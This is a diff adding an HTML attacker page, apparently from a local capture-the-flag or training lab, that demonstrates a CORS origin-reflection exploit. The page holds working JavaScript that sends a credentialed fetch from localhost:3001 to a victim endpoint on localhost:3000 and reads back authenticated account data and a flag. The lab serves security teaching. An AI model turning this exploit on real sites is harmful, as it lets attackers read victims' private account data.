@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>X1 — CORS Origin Reflection Exploit</title>
+  <style>
+    body { background: #0d1117; color: #e6edf3; font-family: 'Courier New', monospace; padding: 24px; margin: 0; }
+    h1 { color: #3fb950; font-size: 1.2rem; margin-bottom: 16px; }
+    h2 { color: #58a6ff; font-size: 1rem; margin: 16px 0 8px; }
+    .terminal { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin: 12px 0; white-space: pre-wrap; font-size: 0.85rem; min-height: 60px; }
+    .status { color: #d29922; }
+    .success { color: #3fb950; }
+    .error { color: #f85149; }
+    button { background: #238636; color: #e6edf3; border: 1px solid #3fb950; border-radius: 4px; padding: 8px 16px; cursor: pointer; font-family: inherit; margin: 4px 2px; }
+    button:hover { background: #2ea043; }
+    input[type=text] { background: #161b22; color: #e6edf3; border: 1px solid #30363d; border-radius: 4px; padding: 8px; font-family: inherit; width: 100%; margin: 4px 0 8px; }
+    label { color: #7d8590; font-size: 0.85rem; }
+    a { color: #58a6ff; }
+    .badge { display: inline-block; font-size: 0.75rem; padding: 2px 8px; border-radius: 12px; margin-right: 6px; }
+    .attacker-badge { background: rgba(248,81,73,0.15); border: 1px solid #f85149; color: #f85149; }
+    .victim-badge { background: rgba(88,166,255,0.15); border: 1px solid #58a6ff; color: #58a6ff; }
+
+    .origin-bar {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 10px 14px;
+      margin-bottom: 20px;
+      font-size: 0.82rem;
+      display: flex;
+      gap: 24px;
+      flex-wrap: wrap;
+    }
+    .code-block {
+      background: #161b22;
+      border: 1px solid #388bfd44;
+      border-left: 3px solid #58a6ff;
+      border-radius: 6px;
+      padding: 14px 16px;
+      margin: 10px 0;
+      white-space: pre;
+      font-size: 0.82rem;
+      overflow-x: auto;
+    }
+    .flag-box {
+      background: rgba(63,185,80,0.08);
+      border: 1px solid #3fb950;
+      border-radius: 6px;
+      padding: 14px 16px;
+      margin: 12px 0;
+      font-size: 1rem;
+    }
+    .nav { margin-bottom: 20px; font-size: 0.82rem; }
+    .divider { border: none; border-top: 1px solid #21262d; margin: 20px 0; }
+  </style>
+</head>
+<body>
+
+  <div class="nav"><a href="index.html">← Exploit Console</a></div>
+
+  <h1>[X1] CORS Origin Reflection Exploit</h1>
+
+  <div class="origin-bar">
+    <span><span class="badge attacker-badge">ATTACKER</span> http://localhost:3001 <em style="color:#6e7681">(this page)</em></span>
+    <span><span class="badge victim-badge">TARGET</span> http://localhost:3000 → /api/x1/account</span>
+  </div>
+
+  <p style="color:#7d8590; font-size:0.85rem; margin: 0 0 16px;">
+    The victim server reads the incoming <code>Origin</code> header and echoes it back verbatim in
+    <code>Access-Control-Allow-Origin</code>, while also sending <code>Access-Control-Allow-Credentials: true</code>.
+    This means <em>any</em> origin — including this attacker page — can read authenticated responses.
+  </p>
+
+  <button onclick="runExploit()">Launch CORS Exploit</button>
+  <button onclick="clearOutput()" style="background:#21262d; border-color:#30363d;">Clear</button>
+
+  <h2>Request Log</h2>
+  <div class="terminal" id="log"><span class="status">Waiting for exploit launch...</span></div>
+
+  <h2>Response Headers (Proof of Reflection)</h2>
+  <div class="terminal" id="headers"><span class="status">No request sent yet.</span></div>
+
+  <h2>Response Data</h2>
+  <div class="terminal" id="response"><span class="status">No response yet.</span></div>
+
+  <div id="flag-container" style="display:none;">
+    <h2>Captured Flag</h2>
+    <div class="flag-box success" id="flag-display"></div>
+  </div>
+
+  <div class="divider"></div>
+
+  <h2>Exploit Code</h2>
+  <div class="code-block" id="exploit-source"></div>
+
+  <script>
+    // Populate the visible code block with the exploit source
+    const exploitSource = `// The exploit: fetch the victim's authenticated endpoint cross-origin.
+// The browser automatically attaches our localhost:3000 session cookie
+// because we pass credentials: 'include'. Normally the browser would
+// block us from *reading* the response (SOP), but the server's broken
+// CORS policy lets us read it anyway.
+
+async function exploit() {
+  const res = await fetch('http://localhost:3000/api/x1/account', {
+    credentials: 'include'  // sends victim's session cookies
+  });
+
+  // Inspect the CORS headers the server sent back
+  const acao = res.headers.get('Access-Control-Allow-Origin');
+  const acac = res.headers.get('Access-Control-Allow-Credentials');
+  // acao will equal 'http://localhost:3001' — the server reflected our Origin.
+  // acac will be 'true', which is what allows the browser to expose the body to us.
+
+  const data = await res.json();
+  // The flag is in the response because CORS reflects our origin + allows credentials.
+  return { headers: { acao, acac }, data };
+}`;
+    document.getElementById('exploit-source').textContent = exploitSource;
+
+    function log(msg, cls) {
+      const el = document.getElementById('log');
+      if (el.querySelector('.status')) el.innerHTML = '';
+      const line = document.createElement('span');
+      line.className = cls || '';
+      line.textContent = msg + '\n';
+      el.appendChild(line);
+    }
+
+    function clearOutput() {
+      document.getElementById('log').innerHTML = '<span class="status">Waiting for exploit launch...</span>';
+      document.getElementById('headers').innerHTML = '<span class="status">No request sent yet.</span>';
+      document.getElementById('response').innerHTML = '<span class="status">No response yet.</span>';
+      document.getElementById('flag-container').style.display = 'none';
+    }
+
+    async function runExploit() {
+      const logEl     = document.getElementById('log');
+      const headersEl = document.getElementById('headers');
+      const responseEl= document.getElementById('response');
+
+      logEl.innerHTML = '';
+      headersEl.innerHTML = '';
+      responseEl.innerHTML = '';
+
+      log('[*] Exploit starting — this page is running on http://localhost:3001', 'status');
+      log('[*] Sending fetch to http://localhost:3000/api/x1/account', 'status');
+      log('[*] Request includes: credentials: "include" (browser will attach localhost:3000 session cookie)', 'status');
+
+      try {
+        const res = await fetch('http://localhost:3000/api/x1/account', {
+          credentials: 'include'  // sends victim's session cookies
+        });
+
+        // Read the critical CORS response headers
+        const acao = res.headers.get('Access-Control-Allow-Origin');
+        const acac = res.headers.get('Access-Control-Allow-Credentials');
+        const ct   = res.headers.get('Content-Type');
+
+        // Display headers proof
+        let headerText = '';
+        headerText += `Access-Control-Allow-Origin:       ${acao || '(not set)'}\n`;
+        headerText += `Access-Control-Allow-Credentials:  ${acac || '(not set)'}\n`;
+        headerText += `Content-Type:                      ${ct   || '(not set)'}\n`;
+        headerText += '\n';
+
+        if (acao === 'http://localhost:3001') {
+          headerText += '[CRITICAL] Server reflected our attacker origin back — any origin is trusted!\n';
+          headersEl.innerHTML = headerText;
+          const reflectLine = headersEl.lastChild;
+          headersEl.appendChild(Object.assign(document.createElement('span'), {
+            className: 'error',
+            textContent: '[CRITICAL] Server reflected our attacker origin back — any origin is trusted!\n'
+          }));
+          // Remove the plain text duplicate
+          headersEl.removeChild(reflectLine);
+        } else {
+          headersEl.textContent = headerText;
+        }
+
+        if (acac === 'true') {
+          const credLine = document.createElement('span');
+          credLine.className = 'error';
+          credLine.textContent = '[CRITICAL] Access-Control-Allow-Credentials: true — browser exposes authenticated response to us!\n';
+          headersEl.appendChild(credLine);
+        }
+
+        log(`[+] HTTP ${res.status} received from victim`, 'success');
+        log(`[+] ACAO header: ${acao}`, 'success');
+        log(`[+] ACAC header: ${acac}`, acac === 'true' ? 'error' : '');
+
+        if (!res.ok) {
+          log(`[-] Non-OK status: ${res.status}`, 'error');
+          responseEl.innerHTML = `<span class="error">HTTP ${res.status} — are you logged in at http://localhost:3000 ?</span>`;
+          return;
+        }
+
+        const data = await res.json();
+        responseEl.textContent = JSON.stringify(data, null, 2);
+
+        // Hunt for a flag in the response
+        const raw = JSON.stringify(data);
+        const flagMatch = raw.match(/flag\{[^}]+\}/i) || raw.match(/"flag"\s*:\s*"([^"]+)"/i);
+
+        if (data.flag || flagMatch) {
+          const flagValue = data.flag || (flagMatch && flagMatch[1]) || flagMatch[0];
+          document.getElementById('flag-container').style.display = 'block';
+          document.getElementById('flag-display').textContent = 'FLAG: ' + flagValue;
+          log('[!!!] FLAG CAPTURED: ' + flagValue, 'success');
+        }
+
+      } catch (err) {
+        log('[-] Fetch failed: ' + err.message, 'error');
+        log('    Possible reasons:', 'status');
+        log('    • Victim server (localhost:3000) is not running', 'status');
+        log('    • You are not logged in at localhost:3000', 'status');
+        log('    • Server is NOT vulnerable (CORS is correctly configured)', 'status');
+        responseEl.innerHTML = `<span class="error">${err.message}</span>`;
+        headersEl.innerHTML  = `<span class="error">No response received.</span>`;
+      }
+    }
+  </script>
+
+</body>
+</html>
